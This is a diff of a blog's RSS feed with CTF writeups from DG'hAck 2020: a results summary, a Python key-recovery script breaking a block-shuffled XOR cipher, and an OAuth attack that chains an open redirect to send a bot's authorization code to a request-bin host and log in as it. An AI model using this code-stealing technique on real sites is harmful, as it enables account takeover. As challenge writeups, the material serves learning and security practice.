@@ -1,34 +1,1048 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>dghack on Nicolas Bourras</title><link>https://nicolasb.fr/tags/dghack/</link><description>Recent content in dghack on Nicolas Bourras</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 01 Dec 2020 14:37:19 +0100</lastBuildDate><atom:link href="https://nicolasb.fr/tags/dghack/index.xml" rel="self" type="application/rss+xml"/><item><title>DG'hAck: My Second CTF</title><link>https://nicolasb.fr/blog/dghack-my-second-ctf/</link><pubDate>Tue, 01 Dec 2020 14:37:19 +0100</pubDate><guid>https://nicolasb.fr/blog/dghack-my-second-ctf/</guid><description>I joined this CTF because there was a possiblity to get an internship (or a job). I think I did pretty well, ranking 1/1214 among the students, and 5 overall out of 2063 :)
 This was a whole lot of fun, I got to learn a ton of things, lose some sleep, and make new friends. I can&amp;rsquo;t wait for my next CTF!
-Here are the challenges that I completed, with links to my writeups:</description></item><item><title>Writeup DG'hAck: Involucrypt 2</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</link><pubDate>Tue, 01 Dec 2020 04:11:32 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</guid><description>This is the second version of the involucrypt challenge. You can see my writeup of the first version here. It presents the encryption script and a simple bruteforce approach.
-The only thing that changed for the second version is the encrypted data, which is now 1497 bytes long. This makes the previous bruteforce attempt unusable: checking a single key takes about 50ms on my machine, and there are a lot of possible keys (since it&amp;rsquo;s 10 chars instead of 3).</description></item><item><title>Writeup DG'hAck: Job Board</title><link>https://nicolasb.fr/blog/writeup-dghack-job-board/</link><pubDate>Mon, 30 Nov 2020 17:45:33 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-job-board/</guid><description>This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:
-Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.</description></item><item><title>Writeup DG'hAck: Time for Something Different</title><link>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</link><pubDate>Mon, 30 Nov 2020 17:03:31 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</guid><description>This is a steganography challenge where we&amp;rsquo;re given a PCAP file. Opening it in wireshark reveals a list of identical ICMP packets.
+Here are the challenges that I completed, with links to my writeups:</description><content>&lt;p>I joined this CTF because there was a possiblity to get an internship (or a job). I think I did pretty well, ranking 1/1214 among the students, and 5 overall out of 2063 :)&lt;/p>
+&lt;p>This was a whole lot of fun, I got to learn a ton of things, lose some sleep, and make new friends. I can&amp;rsquo;t wait for my next CTF!&lt;/p>
+&lt;p>Here are the challenges that I completed, with links to my writeups:&lt;/p>
+&lt;ul>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-internal-support-1/">Internal support 1&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-internal-support-2/">Internal support 2&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-up-credit/">UpCredit&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-server-room/">Server room&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-walters-blog/">Walter&amp;rsquo;s Blog&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/">Involucrypt1&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-gitbad/">GitBad&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-shadowmallet/">ShadowMallet&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> Dharma.exe&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-sad-crypto/">Sad Crypto&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-bwing/">Bwing&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-stickitup/">StickItUp&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/">Time for something different&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> Strange thing&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> FlightControl&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-job-board/">JobBoard&lt;/a>&lt;/li>
+&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/">Involucrypt2&lt;/a>&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> file_reader&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> MyBDD&lt;/li>
+&lt;/ul>
+&lt;p>I still need to get better at binary exploitation / reverse engineering!&lt;/p>
+&lt;h2 id="screenshots">Screenshots&lt;/h2>
+&lt;p>The results (&lt;a href="https://www.defense.gouv.fr/dga/actualite/cybersecurite-resultats-du-challenge-dg-hack">source&lt;/a>):
+&lt;a href="https://nicolasb.fr/assets/dghack/resultats.jpg">&lt;img src="https://nicolasb.fr/assets/dghack/resultats.jpg" alt="The scoreboard for everyone">&lt;/a>&lt;/p>
+&lt;p>The general scoreboard:
+&lt;a href="https://nicolasb.fr/assets/dghack/scoreboard-general.png">&lt;img src="https://nicolasb.fr/assets/dghack/scoreboard-general.png" alt="The scoreboard for everyone">&lt;/a>&lt;/p>
+&lt;p>The student scoreboard:
+&lt;a href="https://nicolasb.fr/assets/dghack/scoreboard-student.png">&lt;img src="https://nicolasb.fr/assets/dghack/scoreboard-student.png" alt="The dashboard">&lt;/a>&lt;/p>
+&lt;p>And my dashboard:
+&lt;a href="https://nicolasb.fr/assets/dghack/challenges.jpg">&lt;img src="https://nicolasb.fr/assets/dghack/challenges.jpg" alt="The dashboard">&lt;/a>&lt;/p></content></item><item><title>Writeup DG'hAck: Involucrypt 2</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</link><pubDate>Tue, 01 Dec 2020 04:11:32 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</guid><description>This is the second version of the involucrypt challenge. You can see my writeup of the first version here. It presents the encryption script and a simple bruteforce approach.
+The only thing that changed for the second version is the encrypted data, which is now 1497 bytes long. This makes the previous bruteforce attempt unusable: checking a single key takes about 50ms on my machine, and there are a lot of possible keys (since it&amp;rsquo;s 10 chars instead of 3).</description><content>&lt;p>This is the second version of the involucrypt challenge. You can see my writeup of the first version &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/">here&lt;/a>. It presents the encryption script and a simple bruteforce approach.&lt;/p>
+&lt;p>The only thing that changed for the second version is the encrypted data, which is now &lt;code>1497&lt;/code> bytes long. This makes the previous bruteforce attempt unusable: checking a single key takes about 50ms on my machine, and there are a lot of possible keys (since it&amp;rsquo;s 10 chars instead of 3).&lt;/p>
+&lt;p>After looking at the code, the only weird thing I found was the &lt;code>base&lt;/code> parameter:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">keystream&lt;/span>(seeds, length, base&lt;span style="color:#f92672">=&lt;/span>None):
+key &lt;span style="color:#f92672">=&lt;/span> base &lt;span style="color:#66d9ef">if&lt;/span> base &lt;span style="color:#66d9ef">else&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> seed &lt;span style="color:#f92672">in&lt;/span> seeds:
+random &lt;span style="color:#f92672">=&lt;/span> mersenne_rng(seed)
+&lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(BLOCK):
+&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
+&lt;span style="color:#66d9ef">break&lt;/span>
+key&lt;span style="color:#f92672">.&lt;/span>append(random&lt;span style="color:#f92672">.&lt;/span>get_rand_int(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">255&lt;/span>))
+random&lt;span style="color:#f92672">.&lt;/span>shuffle(key)
+&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">return&lt;/span> key
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s not used anywhere! It allows the keystream function to &amp;ldquo;resume&amp;rdquo; itself: to add blocks at the end of an already generated keystream.&lt;/p>
+&lt;p>At first glance, it might seem like it would be a great way to speedup the bruteforce. And it is! But there are still way too many possibilities (&lt;code>26^10&lt;/code> or &lt;code>141167095653376&lt;/code>, if we assume the key is still made up of lowercase letters).&lt;/p>
+&lt;p>The thing that you had to notice was the way the blocks are shuffled. Let&amp;rsquo;s look at an example.&lt;/p>
+&lt;p>We&amp;rsquo;ll take a message that&amp;rsquo;s 6 bytes long, and a block size of 2.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> list(map(ord, &lt;span style="color:#e6db74">&amp;#39;key&amp;#39;&lt;/span>))
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> BLOCK &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># First, let&amp;#39;s try to encode the whole message:&lt;/span>
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">6&lt;/span>)
+[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># Then, let&amp;#39;s generate the blocks on after another:&lt;/span>
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">2&lt;/span>)
+[&lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>]
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">4&lt;/span>)
+[&lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>]
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">6&lt;/span>)
+[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
+&lt;span style="color:#75715e"># Now let&amp;#39;s use the base param to do the same thing, but starting from the&lt;/span>
+&lt;span style="color:#75715e"># last block (using zeros as padding).&lt;/span>
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>:], &lt;span style="color:#ae81ff">6&lt;/span>, base&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> BLOCK &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>)
+[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>]
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>:], &lt;span style="color:#ae81ff">6&lt;/span>, base&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> BLOCK &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
+[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>:], &lt;span style="color:#ae81ff">6&lt;/span>, base&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> BLOCK &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Noticed something? When starting from the last block, the integers are in the right place. This allows us to try and decrypt the bytes, and then by simply checking if the characters are valid or not determine the last letter of the key. We can then repeat this process for the penultimate block, and up until we reach the first one.&lt;/p>
+&lt;p>We can use this simple trick to reduce the space we need to search from &lt;code>26^10&lt;/code> to &lt;code>26*10&lt;/code>. This is way better! Let&amp;rsquo;s write a script:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> sys
+&lt;span style="color:#f92672">import&lt;/span> math
+&lt;span style="color:#f92672">import&lt;/span> string
+&lt;span style="color:#f92672">import&lt;/span> operator
+&lt;span style="color:#f92672">import&lt;/span> itertools
+&lt;span style="color:#75715e"># Note: I renamed the script `crypt.py` to `ccrypt.py`, to avoid naming issues.&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> ccrypt &lt;span style="color:#f92672">import&lt;/span> keystream, BLOCK
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(string, key, base):
+key &lt;span style="color:#f92672">=&lt;/span> keystream(map(ord, key), len(string), base)
+stream &lt;span style="color:#f92672">=&lt;/span> itertools&lt;span style="color:#f92672">.&lt;/span>starmap(operator&lt;span style="color:#f92672">.&lt;/span>xor, zip(key, string))
+&lt;span style="color:#66d9ef">return&lt;/span> list(stream)
+data &lt;span style="color:#f92672">=&lt;/span> open(sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
+block_count &lt;span style="color:#f92672">=&lt;/span> math&lt;span style="color:#f92672">.&lt;/span>ceil(len(data) &lt;span style="color:#f92672">/&lt;/span> BLOCK)
+password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Key: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> block_count, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">for&lt;/span> block &lt;span style="color:#f92672">in&lt;/span> range(block_count &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
+guesses &lt;span style="color:#f92672">=&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> guess &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase:
+key &lt;span style="color:#f92672">=&lt;/span> guess &lt;span style="color:#f92672">+&lt;/span> password
+decrypted &lt;span style="color:#f92672">=&lt;/span> encrypt(data, key, bytearray(bytes(BLOCK &lt;span style="color:#f92672">*&lt;/span> block)))
+valid_count &lt;span style="color:#f92672">=&lt;/span> sum(&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> c &lt;span style="color:#f92672">in&lt;/span> decrypted &lt;span style="color:#66d9ef">if&lt;/span> chr(c) &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable)
+guesses&lt;span style="color:#f92672">.&lt;/span>append((key, decrypted, valid_count))
+password, _, _ &lt;span style="color:#f92672">=&lt;/span> max(guesses, key&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">lambda&lt;/span> x: x[&lt;span style="color:#ae81ff">2&lt;/span>])
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Key: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> block &lt;span style="color:#f92672">+&lt;/span> password, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Content:&amp;#34;&lt;/span>)
+decoded &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(
+chr(a &lt;span style="color:#f92672">^&lt;/span> b) &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(data, keystream(map(ord, password), len(data)))
+)
+&lt;span style="color:#66d9ef">print&lt;/span>(decoded)
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And run it:&lt;/p>
+&lt;pre>&lt;code>$ pypy3 brute3.py involucrypt2
+Key: ajjfisptoi
+Content:
+It's something about ya girl,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+that just makes my head wanna twirl,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+oh you got me want to tell all them other girls,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+there's nothing else better in this world!
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+the moment i seen her i was in shock
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+so shocked you would've think I've just been shot,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+shot down right now in this spot.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+But too bad this doesn't happen a lot.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Oh girl you got me visualizing me on top,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+on top of your hot body while were sweating a lot,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+a lot of time on the clock before we have to stop.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+too bad shes not into that stuff a lot,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+oh man shes really super hot,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+hotter than the sun that's right on top,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Oh man there she goes i had to stop,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+and ask her some questions that i had in stock.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+She said she want's to take it slow,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+i'm not that type of guy ill let cha know,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+when i see that red light all i know is go,
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+so baby girl lets do this on the floor.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+show me your moves that makes you such a pro
+*the flag is supahotfire*
+&lt;/code>&lt;/pre>&lt;p>This took 10 seconds on my machine (thanks to &lt;a href="https://www.pypy.org/">pypy3&lt;/a>), which is really short. The key is &lt;code>ajjfisptoi&lt;/code>, and the flag is &lt;code>supahotfire&lt;/code>.&lt;/p>
+&lt;p>Note: running the new script on &lt;code>involucrypt1&lt;/code> successfully decrypts it in about half a second, which is a nice speedup.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Job Board</title><link>https://nicolasb.fr/blog/writeup-dghack-job-board/</link><pubDate>Mon, 30 Nov 2020 17:45:33 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-job-board/</guid><description>This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:
+Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.</description><content>&lt;p>This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/job-board-landing.png">&lt;img src="https://nicolasb.fr/assets/dghack/job-board-landing.png" alt="The dashboard">&lt;/a>&lt;/p>
+&lt;p>Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.&lt;/p>
+&lt;p>Clicking the login button prompts us for a username and password; the &lt;code>test/test&lt;/code> combination works. We&amp;rsquo;re greeted with a list of jobs:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/job-board-positions.png">&lt;img src="https://nicolasb.fr/assets/dghack/job-board-positions.png" alt="The available jobs">&lt;/a>&lt;/p>
+&lt;p>Now the authentication system looks like OAuth, which is quite complicated. Let&amp;rsquo;s look at the URLs called when logging in:&lt;/p>
+&lt;ul>
+&lt;li>POST &lt;code>http://jobboard2.chall.malicecyber.com/oauth/authorize&lt;/code>, with the params:
+&lt;pre>&lt;code>client_id=svvhKlyEA7qODbl16JTUPQNz
+response_type=code
+redirect_uri=http://jobboard2.chall.malicecyber.com/connect/auth/callback
+scope=profile
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>GET &lt;code>http://jobboard2.chall.malicecyber.com/connect/auth/callback&lt;/code>, with the single param &lt;code>code=FOOdZjenThSgRBOBmbP2jB2TOzxb79xNNbFyi24h3I1DPuD5&lt;/code>&lt;/li>
+&lt;li>GET &lt;code>http://jobboard2.chall.malicecyber.com/login&lt;/code>, with the params:
+&lt;pre>&lt;code>access_token=BlhXQy0AbcoocRXTmWUTpXCyNFKLnrYgZoF2eIW9Id
+raw[access_token]=BlhXQy0AbcoocRXTmWUTpXCyNFKLnrYgZoF2eIW9Id
+raw[expires_in]=864000
+raw[scope]=profile
+raw[token_type]=Bearer
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ul>
+&lt;p>The first URL (the login form) redirects to the second, and the second to the third.&lt;/p>
+&lt;p>If we assume that the bot will sign in when presented with the login form, the &lt;code>redirect_uri&lt;/code> parameter gets really interesting. We could just change it to a URI on our server, and get a code allowing us to login with the account that the bot uses.&lt;/p>
+&lt;p>Replacing the URI with a custom one yields the following error:&lt;/p>
+&lt;pre>&lt;code>invalid_request: Invalid &amp;quot;redirect_uri&amp;quot; in request.
+&lt;/code>&lt;/pre>&lt;p>However, we seem to be able to change the path, eg:&lt;/p>
+&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/REDIRECT
+&lt;/code>&lt;/pre>&lt;p>So if we find an open redirect on the server, we can get the code. Looking more closely at the list of jobs, we find that clicking on one redirects to:&lt;/p>
+&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/safelink/http%3A%2F%2Fexample.com%2F
+&lt;/code>&lt;/pre>&lt;p>After creating a &lt;a href="https://requestbin.com/">request bin&lt;/a>, we can replace the example domain:&lt;/p>
+&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/safelink/https%3A%2F%2Fen43o9xcx03qo.x.pipedream.net
+&lt;/code>&lt;/pre>&lt;p>Opening that link seems to work! We have everything we need now, let&amp;rsquo;s craft our malicious URL:&lt;/p>
+&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/oauth/authorize?client_id=svvhKlyEA7qODbl16JTUPQNz&amp;amp;response_type=code&amp;amp;redirect_uri=http%3A%2F%2Fjobboard2.chall.malicecyber.com%2Fsafelink%2Fhttps%253A%252F%252Fen43o9xcx03qo.x.pipedream.net&amp;amp;scope=profile
+&lt;/code>&lt;/pre>&lt;p>And send it to the bot. After a few seconds, we see:&lt;/p>
+&lt;pre>&lt;code>/?code=qAV9LcN3T2vb8Fjycx6pqGZBIPyLs0nCqphbLqohi9929iq5
+&lt;/code>&lt;/pre>&lt;p>Great! Now we just have to open &lt;code>https://jobboard2.chall.malicecyber.com/connect/auth/callback?code=qAV9LcN3T2vb8Fjycx6pqGZBIPyLs0nCqphbLqohi9929iq5&lt;/code> in our browser, and we&amp;rsquo;re logged in!&lt;/p>
+&lt;p>We see:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/job-board-flag.png">&lt;img src="https://nicolasb.fr/assets/dghack/job-board-flag.png" alt="The secret job">&lt;/a>&lt;/p>
+&lt;p>The flag is &lt;code>DontRollYourOwn&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Time for Something Different</title><link>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</link><pubDate>Mon, 30 Nov 2020 17:03:31 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</guid><description>This is a steganography challenge where we&amp;rsquo;re given a PCAP file. Opening it in wireshark reveals a list of identical ICMP packets.
 Nothing seems to be unique, except the time of each packet, that we can extract using tshark:
-$ tshark -r data.pcap -T fields -e frame.time_epoch 1604485685.271523000 1604485685.974534000 1604485686.737381000 1604485687.390550000 1604485688.103364000 1604485689.336651000 1604485690.500205000 1604485690.982931000 1604485691.465408000 1604485692.617796000 1604485693.701056000 1604485694.814156000 1604485695.686772000 1604485696.799993000 1604485697.943153000 1604485699.106441000 1604485699.589015000 1604485700.071611000 1604485700.754520000 1604485701.266580000 1604485702.449633000 1604485702.942506000 1604485704.054744000 1604485705.</description></item><item><title>Writeup DG'hAck: StickItUp</title><link>https://nicolasb.fr/blog/writeup-dghack-stickitup/</link><pubDate>Mon, 30 Nov 2020 11:26:24 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-stickitup/</guid><description>When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:
